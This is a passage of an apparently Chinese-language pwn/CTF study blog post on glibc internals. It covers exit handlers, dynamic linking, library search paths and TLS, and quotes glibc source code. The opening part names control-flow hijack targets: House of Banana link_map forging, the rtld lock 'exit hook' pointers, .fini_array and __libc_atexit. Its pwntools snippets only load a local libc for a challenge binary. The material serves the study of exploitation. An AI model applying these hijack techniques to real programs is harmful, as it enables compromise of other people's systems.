<code>link_map</code> 来实现控制流劫持，这种攻击方法叫做 <strong>House
Of Banana</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//省略了有关SHARED的操作</span></span><br><span class="line"><span class="type">void</span> internal_function _dl_fini (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span>)</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	        assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	        <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">                <span class="comment">//将_rtld_global.dl_ns[ns]._ns_loaded链表的结点经过check后置入maps</span></span><br><span class="line">	            <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">		            assert (i &lt; nloaded);</span><br><span class="line">                    maps[i] = l;</span><br><span class="line">		            l-&gt;l_idx = i;</span><br><span class="line">		            ++i;</span><br><span class="line">		            ++l-&gt;l_direct_opencount;</span><br><span class="line">	            &#125;</span><br><span class="line">	        assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	        assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//_ns_loaded链表中至少有三个节点</span></span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line">	        _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">	        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">	            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line">                <span class="comment">//遍历执行maps[i]里的函数指针</span></span><br><span class="line">	            <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">		            l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">		            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	        	        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, DSO_FILENAME (l-&gt;l_name), ns);</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			                ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			                    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			            &#125;</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			                DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">	            --l-&gt;l_direct_opencount;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>_dl_fini</code> 中的
<code>__rtld_lock_lock_recursive</code> 和
<code>__rtld_lock_unlock_recursive</code> 宏展开后分别为
<code>_rtld_local._dl_rtld_lock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code>
和
<code>_rtld_local._dl_rtld_unlock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code>
因此我们可以劫持对应函数指针完成控制流劫持，这些函数指针就是<strong>狭义上的
exit hook</strong> 。</p>
<p>如果是<strong>静态链接程序</strong> <code>__run_exit_handlers</code>
函数会调用 <code>__libc_csu_fini</code>
函数。<code>__libc_csu_fini</code> 函数会依次调用
<code>.fini_array</code> 中的函数指针，因此我们可以通过改写
<code>.fini_array</code> 实现控制流劫持。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="type">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>RUN_HOOK</code> 宏：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure></div>
<p>这个宏展开后的结果如下，可以看到这个宏会依次调用
<code>__start___libc_atexit</code> 函数指针数组直到遇到 NULL 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> *ptr;</span><br><span class="line">    <span class="keyword">for</span> (ptr = (<span class="type">void</span> *<span class="type">const</span> *) ((<span class="type">void</span> *<span class="type">const</span> *) (&amp;__start___libc_atexit)); !((ptr) &gt;= (<span class="type">void</span> *<span class="type">const</span> *) &amp;__stop___libc_atexit); ++ptr) (*(<span class="type">____libc_atexit_hook_function_t</span> *) *ptr)();</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p>函数指针所在的内存在动态链接程序中位于 libc 上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004928203.png"
                     
alt="image-20241108004928203" 
                > 在静态链接程序中位于程序的
<code>__libc_atexit</code> 段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108004951294.png"
                     
alt="image-20241108004951294" 
                > 用于 <strong><code>FSOP</code></strong>
的 <code>_IO_cleanup</code>
就是在这里被调用的，另外如果我们能控制这里的函数指针也可以劫持程序执行流程。</p>
<h1 id="共享库">共享库</h1>
<h2 id="共享库版本">共享库版本</h2>
<h3 id="共享库版本命名">共享库版本命名</h3>
<p>Linux有一套规则来命名系统中的每一个共享库，它规定共享库的文件名规则必须如下：
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">libname.so.x.y.z</span><br></pre></td></tr></table></figure></div> 最前面使用前缀 <code>lib</code> 、中间是库的名字和后缀
<code>.so</code> ，最后面跟着的是三个数字组成的版本号。<code>x</code>
表示主版本号（Major Version Number），<code>y</code> 表示次版本号（Minor
Version Number），<code>z</code> 表示发布版本号（Release Version
Number）。三个版本号的含义不一样。 -
主版本号表示库的重大升级，不同主版本号的库之间是不兼容的，依赖于旧的主版本号的程序需要改动相应的部分，并且重新编译，才可以在新版的共享库中运行；或者，系统必须保留旧版的共享库，使得那些依赖于旧版共享库的程序能够正常运行。
-
次版本号表示库的增量升级，即增加一些新的接口符号，且保持原来的符号不变。在主版本号相同的情况下，高的次版本号的库向后兼容低的次版本号的库。
-
发布版本号表示库的一些错误的修正、性能的改进等，并不添加任何新的接口，也不对接口进行更改。相同主版本号、次版本号的共享库，不同的发布版本号之间完全兼容，依赖于某个发布版本号的程序可以在任何一个其他发布版本号中正常运行，而无须做任何修改。
### SO-NAME 系统普遍采用一种叫做 SO-NAME
的命名机制来记录共享库的依赖关系。每个共享库都有一个对应的 SO-NAME
，这个 SO-NAME
即共享库的文件名去掉次版本号和发布版本号，保留主版本号。比如一个共享库叫做
<code>libfoo.so.2.6.1</code> ，那么它的 SO-NAME 即
<code>libfoo.so.2</code> 。很明显，SO-NAME 规定了共享库的接口，SO-NAME
的两个相同共享库，次版本号大的兼容次版本号小的。在 Linux
系统中，系统会为每个共享库在它所在的目录创建一个跟 SO-NAME
相同的并且指向它的软链接（Symbol Link）。比如系统中有存在一个共享库
<code>/lib/libfoo.so.2.6.1</code> ，那么 Linux
中的共享库管理程序就会为它产生一个软链接 <code>/lib/libfoo.so.2</code>
指向它。比如 Linux 系统的 Glibc 共享库（注意稍高版本的 libc 的
<code>libc.so.6</code> 本身就是动态库，不是符号链接）： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">lrwxrwxrwx 1 root root 12 Apr  7  2022 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so</span><br><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">-rwxr-xr-x 1 root root 2029592 Apr  7  2022 /lib/x86_64-linux-gnu/libc-2.31.so</span><br></pre></td></tr></table></figure></div>
由于历史原因，动态链接器和 C 语言库的共享对象文件名规则不按 Linux
标准的共享库命名方法，但是 C 语言的 SO-NAME 还是按照正常的规则。</p>
<p>另外动态连接器的 SO-NAME 命名不按照普通的规则。 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /lib64/ld-linux-x86-64.so.2</span><br><span class="line">lrwxrwxrwx 1 root root 32 Apr  7  2022 /lib64/ld-linux-x86-64.so.2 -&gt; /lib/x86_64-linux-gnu/ld-2.31.so</span><br></pre></td></tr></table></figure></div></p>
<p>建立以 SO-NAME
为名字的软链接目的是，使得所有依赖某个共享库的模块，在编译、链接和运行时，都使用共享库的
SO-NAME ，而不使用详细的版本号。</p>
<p>动态链接文件中的 <code>.dynamic</code> 段中的 <code>DT_NEED</code>
类型的字段就是 SO-NAME
而不是共享库的完整名字，这样当动态链接器进行共享库依赖文件查找时，就会根据系统中各种共享库目录中的SO-NAME软链接自动定向到最新版本的共享库。</p>
<p>当共享库进行升级的时候，如果只是进行增量升级，即保持主版本号不变，只改变次版本号或发布版本号，那么我们可以直接将新版的共享库替换掉旧版，并且修改
SO-NAME
的软链接指向新版本共享库，即可实现升级；当共享库的主版本号升级时，系统中就会存在多个
SO-NAME ，由于这些 SO-NAME 并不相同，所以已有的程序并不会受影响。</p>
<p>Linux 中提供了一个工具叫做 <code>ldconfig</code>
，当系统中安装或更新一个共享库时，就需要运行这个工具，它会遍历所有的默认共享库目录，比如
<code>/lib</code> 、<code>/usr/lib</code>
等，然后更新所有的软链接，使它们指向最新版的共享库；如果安装了新的共享库，那么
<code>ldconfig</code> 会为其创建相应的软链接。</p>
<h3 id="符号版本">符号版本</h3>
<p>根据提到的可知，一个程序所依赖的共享库的次版本号如果高于系统中的共享库，那么就不保证该程序能在该系统中运行，这类问题叫做次版本号交会问题（Minor-revision
Rendezvous Problem）。</p>
<p>这种次版本号交会问题并没有因为 SO-NAME
的存在而得到任何改善。对于这个问题，现代的系统通过一种更加精巧的方式来解决，那就是符号版本机制。这个方案的基本思路是让每个导出和导入的符号都有一个相关联的版本号，它的实际做法类似于名称修饰的方法。</p>
<p><code>.dynamic</code> 段中的 <code>DT_VERSYM</code>
类型字段包含了符号版本。它的作用是维护库的版本信息，以便在运行时进行版本控制和符号解析。通过
<code>DT_VERSYM</code>
，动态链接器可以确定所链接的库的版本与运行时环境是否兼容，以及选择正确的版本来解析符号。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005224309.png"
                     
alt="image-20241108005224309" 
                >
<figcaption aria-hidden="true">image-20241108005224309</figcaption>
</figure>
<h2 id="共享库系统路径">共享库系统路径</h2>
<p>目前大多数包括 Linux 在内的开源操作系统都遵守一个叫做 FHS（File
Hierarchy
Standard）的标准，这个标准规定了一个系统中的系统文件应该如何存放，包括各个目录的结构、组织和作用，这有利于促进各个开源操作系统之间的兼容性。共享库作为系统中重要的文件，它们的存放方式也被
FHS 列入了规定范围。FHS
规定，一个系统中主要有两个存放共享库的位置，它们分别如下： -
<code>/lib</code>：该目录包含操作系统核心组件所需的共享库文件。这些库文件通常是系统引导和运行时所必需的，例如与操作系统内核相关的库文件。
-
<code>/usr/lib</code>：该目录包含操作系统提供的额外共享库文件。这些库文件用于支持系统上安装的应用程序和工具的运行，如图形界面工具包（GUI
toolkit）、网络库、数据库驱动程序等。 -
<code>/usr/local/lib</code>：该目录是用于安装本地（local）软件的库文件的默认位置。当用户手动编译和安装软件到系统时，通常会将其安装到
<code>/usr/local</code> 目录下。因此，相关的库文件也会被安装到
<code>/usr/local/lib</code> 目录下。 ## 共享库查找过程
动态链接器对于模块的查找有一定的规则：如果 <code>DT_NEED</code>
里面保存的是绝对路径，那么动态链接器就按照这个路径去查找；如果
<code>DT_NEED</code> 里面保存的是相对路径，那么动态链接器会在
<code>/lib</code> 、<code>/usr/lib</code> 和由
<code>/etc/ld.so.conf</code>
配置文件指定的目录中查找共享库。为了程序的可移植性和兼容性，共享库的路径往往是相对的。</p>
<p><code>ld.so.conf</code>
是一个文本配置文件，它可能包含其他的配置文件，这些配置文件中存放着目录信息。
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf         </span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf.d/*.conf               </span><br><span class="line">/usr/lib/x86_64-linux-gnu/libfakeroot</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/i386-linux-gnu</span><br><span class="line">/lib/i386-linux-gnu</span><br><span class="line">/usr/lib/i386-linux-gnu</span><br><span class="line">/usr/local/lib/i686-linux-gnu</span><br><span class="line">/lib/i686-linux-gnu</span><br><span class="line">/usr/lib/i686-linux-gnu</span><br><span class="line"><span class="comment"># libc default configuration</span></span><br><span class="line">/usr/local/lib</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/x86_64-linux-gnu</span><br><span class="line">/lib/x86_64-linux-gnu</span><br><span class="line">/usr/lib/x86_64-linux-gnu</span><br><span class="line"><span class="comment"># Legacy biarch compatibility support</span></span><br><span class="line">/lib32</span><br><span class="line">/usr/lib32</span><br></pre></td></tr></table></figure></div>
如果动态链接器在每次查找共享库时都去遍历这些目录，那将会非常耗费时间。所以
Linux 系统中都有一个叫做 <code>ldconfig</code>
的程序，这个程序的作用是为共享库目录下的各个共享库创建、删除或更新相应的
SO-NAME（即相应的符号链接），这样每个共享库的 SO-NAME
就能够指向正确的共享库文件；并且这个程序还会将这些 SO-NAME
收集起来，集中存放到 <code>/etc/ld.so.cache</code> 文件里面，并建立一个
SO-NAME 的缓存。当动态链接器要查找共享库时，它可以直接从
<code>/etc/ld.so.cache</code> 里面查找。而 <code>/etc/ld.so.cache</code>
的结构是经过特殊设计的，非常适合查找，所以这个设计大大加快了共享库的查找过程。</p>
<p>如果动态链接器在 <code>/etc/ld.so.cache</code>
里面没有找到所需要的共享库，那么它还会遍历 <code>/lib</code> 和
<code>/usr/lib</code> 这两个目录，如果还是没找到，就宣告失败。</p>
<p>所以理论上讲，如果我们在系统指定的共享库目录下添加、删除或更新任何一个共享库，或者我们更改了
<code>/etc/ld.so.conf</code> 的配置，都应该运行 <code>ldconfig</code>
这个程序，以便调整 SO-NAME 和 <code>/etc/ld.so.cache</code>
。很多软件包的安装程序在往系统里面安装共享库以后都会调用
<code>ldconfig</code> 。 ## 更改共享库 Linux
系统提供了很多方法来改变动态链接器装载共享库路径的方法，通过使用这些方法，我们可以满足一些特殊的需求，比如共享库的调试和测试、应用程序级别的虚拟等。
### LD_LIBRARY_PATH 在 Linux 系统中，<code>LD_LIBRARY_PATH</code>
是一个由若干个路径组成的环境变量，每个路径之间由冒号隔开。默认情况下，
<code>LD_LIBRARY_PATH</code> 为空。如果我们为某个进程设置了
<code>LD_LIBRARY_PATH</code>
，那么进程在启动时，动态链接器在查找共享库时，会首先查找由
<code>LD_LIBRARY_PATH</code>
指定的目录。这个环境变量可以很方便地让我们测试新的共享库或使用非标准的共享库。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的
pwntools 脚本如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">sh = process(<span class="string">&quot;./lib/ld.so --preload libdl.so.2 ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>: <span class="string">&quot;./lib/&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div> ### LD_PRELOAD
系统中另外还有一个环境变量叫做 <code>LD_PRELOAD</code>
，这个文件中我们可以指定预先装载的一些共享库甚或是目标文件。在
<code>LD_PRELOAD</code>
里面指定的文件会在动态链接器按照固定规则搜索共享库之前装载，它比
<code>LD_LIBRARY_PATH</code>
里面所指定的目录中的共享库还要优先。无论程序是否依赖于它们，<code>LD_PRELOAD</code>
里面指定的共享库或目标文件都会被装载。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的
pwntools 脚本如下： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">process(<span class="string">&quot;./lib/ld.so ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./lib/libc.so.6 ./lib/libdl.so.2&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div> ### LD_DEBUG
另外还有一个非常有用的环境变量 <code>LD_DEBUG</code>
，这个变量可以打开动态链接器的调试功能，当我们设置这个变量时，动态链接器会在运行时打印出各种有用的信息，对于我们开发和调试共享库有很大的帮助。</p>
<p>例如运行 <code>LD_DEBUG=files /bin/ls</code>
命令时动态链接器打印出了整个装载过程，显示程序依赖于哪个共享库并且按照什么步骤装载和初始化，共享库装载时的地址等。</p>
<ul>
<li><code>bindings</code>：显示动态链接的符号绑定过程。</li>
<li><code>libs</code>：显示共享库的查找过程。</li>
<li><code>versions</code>：显示符号的版本依赖关系。</li>
<li><code>reloc</code>：显示重定位过程。</li>
<li><code>symbols</code>：显示符号表查找过程。</li>
<li><code>statistics</code>：显示动态链接过程中的各种统计信息。 ###
patchelf 用于对于依赖不是很复杂的程序更换 libc
，有一下几点需要注意：</li>
<li>如果在漏洞利用时用到了动态链接相关结构最好不要 patchelf，因为
patchelf 会改变动态链接相关结构的位置。</li>
<li>一个程序在一个版本的虚拟机里面 patchelf
后换到另一个版本虚拟机中可能会运行失败。</li>
<li>在 patch 完 libc 后最好把 ld 也 patch 成大版本相同的 ld
，否则会运行失败。</li>
</ul>
<p>修改 libc：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure></div>
<p>修改 ld： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-2.31.so ./pwn</span><br></pre></td></tr></table></figure></div> # 多线程与 TLS ## 基本概念
线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈（如果它知道其他线程的堆栈地址，那么这就是很少见的情况），但实际运用中线程也拥有自己的私有存储空间，包括以下几方面：
-
栈（尽管并非完全无法被其他线程访问，但一般情况下仍然可以认为是私有的数据）。
- 线程局部存储（Thread Local Storage,
TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的容量。
- 寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</p>
<p>实际上，线程私有的数据有： - 局部变量 - 函数的参数 - <strong>TLS
数据</strong></p>
<p>线程共享的数据有： - 全局变量 - 堆上的数据 - 函数里的静态变量 -
程序代码，任何线程都有有权利读取并执行任何代码。 - 打开的文件，A
线程打开的文件可以由 B 线程读写。</p>
<p>一个<strong>全局变量</strong>如果使用 <code>__thread</code>
关键字修饰，那么这个变量就变成线程私有的 <strong>TLS
数据</strong>，也就是说每个线程都在自己所属 TLS
中单独保存一份这个变量的副本。例如下面的代码中，<code>a</code> 和
<code>b</code> 都是 TLS 数据，而 <code>c</code> 是全局变量。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -g -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">uint32_t</span> a = <span class="number">0x114514</span>;</span><br><span class="line">__thread <span class="type">uint32_t</span> b;</span><br><span class="line"><span class="type">uint32_t</span> c = <span class="number">0x1919810</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    a = <span class="number">0x12345678</span>;</span><br><span class="line">    b = <span class="number">0x87654321</span>;</span><br><span class="line">    c = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec78f0738) = 12345678, b(0x7f1ec78f073c) = 87654321, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec70ed6f8) = 114514, b(0x7f1ec70ed6fc) = 0, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div> 分析生成的 ELF 文件的节表，发现多出了
<code>.tdata</code> 和 <code>.tbss</code>
，这两个节分别记录已初始化和未初始化的 TLS 数据。</p>
<p>其中 <code>.tbss</code> 在 ELF 文件中不占用空间， <code>.tdata</code>
在 ELF 中存储了初始化的数据，比如上面的代码中的
<code>__thread uint32_t a = 0x114514</code> 。</p>
<p>ELF 加载到内存中后， <code>.tdata</code> 和 <code>.tbss</code>
这两个节合并为一个段，在程序头表中这个段的 <code>p_type</code> 为
<code>PT_TLS(7)</code> 。</p>
<p>TLS（Thread Local Storage）的结构与 TCB（Thread Control Block）以及
dtv（dynamic thread vector）密切相关，每一个线程中每一个使用了 TLS
功能的模块都拥有一个 TLS Block 。这几者的关系如下图所示：</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108005249673.png"
                     
alt="image-20241108005249673" 
                >
<figcaption aria-hidden="true">image-20241108005249673</figcaption>
</figure>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>这里是 x86_64-ABI 要求的 TLS 结构，Glibc 实现的 TLS
结构与上图有一些差异。</p>

    </div>
  </div>
<p>根据图中显示的信息，TLS Blocks 可以分为两类：</p>
<ul>
<li>一类是程序装载时就已经存在的（位于 TCB 前），这一部分 Block 被称为
<code>_static TLS_</code> 。</li>
<li>一类是右边的 Blocks 是动态分配的，它们被使用 <code>dlopen</code>
函数在程序运行时动态装载的模块所使用。</li>
</ul>
<p>TCB 作为线程控制块，保存着 <code>dtv</code>
数组的入口，<code>dtv</code> 数组中的每一项都是 TLS Block
的入口，它们是指向 TLS Blocks 的指针。特别的，<code>dtv</code>
数组的第一个成员是一个计数器，每当程序使用 <code>dlopen</code> 函数或者
<code>dlfree</code> 函数加载或者卸载一个具备 TLS
变量的模块，该计数器的值都会加一，从而保证程序内版本的一致性。
特别的，ELF 文件本身对应的 TLS Block 一定在 <code>dtv</code>
数组中占据索引为 1 的位置，且位置上与 TCB 相邻。
还需要注意的是，图中出现了一个名为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>p</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">tp_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的指针，在 i386
架构上，这个指针为 gs 段寄存器；在 x86_64 架构上，该指针为 fs
段寄存器。由于该指针与 ELF 文件本身对应的 TLS Block
之间的偏移是固定的，程序在编译时就可以将 ELF
中线程变量的地址硬编码到目标文件中。 ## 主线程 TLS 初始化 前面提到过在
<code>main</code> 开始前会调用 <code>__libc_setup_tls</code> 初始化 TLS
。</p>
<p>在 <code>__libc_setup_tls</code> 函数中，首先会遍历 ELF
的程序头表，找到 <code>p_type</code> 为 <code>PT_TLS(7)</code>
的段，这个段中就存储着 TLS 的初始化数据。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Look through the TLS segment if there is any.  */</span></span><br><span class="line"><span class="keyword">if</span> (_dl_phdr != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">for</span> (phdr = _dl_phdr; phdr &lt; &amp;_dl_phdr[_dl_phnum]; ++phdr)</span><br><span class="line">        <span class="keyword">if</span> (phdr-&gt;p_type == PT_TLS) &#123;</span><br><span class="line">            <span class="comment">/* Remember the values we need.  */</span></span><br><span class="line">            memsz = phdr-&gt;p_memsz;</span><br><span class="line">            filesz = phdr-&gt;p_filesz;</span><br><span class="line">            initimage = (<span class="type">void</span> *) phdr-&gt;p_vaddr + main_map-&gt;l_addr;</span><br><span class="line">            align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">if</span> (phdr-&gt;p_align &gt; max_align)</span><br><span class="line">                max_align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后通过 <code>brk</code> 调用为 TLS 中的数据以及一个
<code>pthread</code> 结构体分配内存。其中 <code>pthread</code>
结构体的第一项为 <code>tcbhead_t header;</code> ，即前面提到的
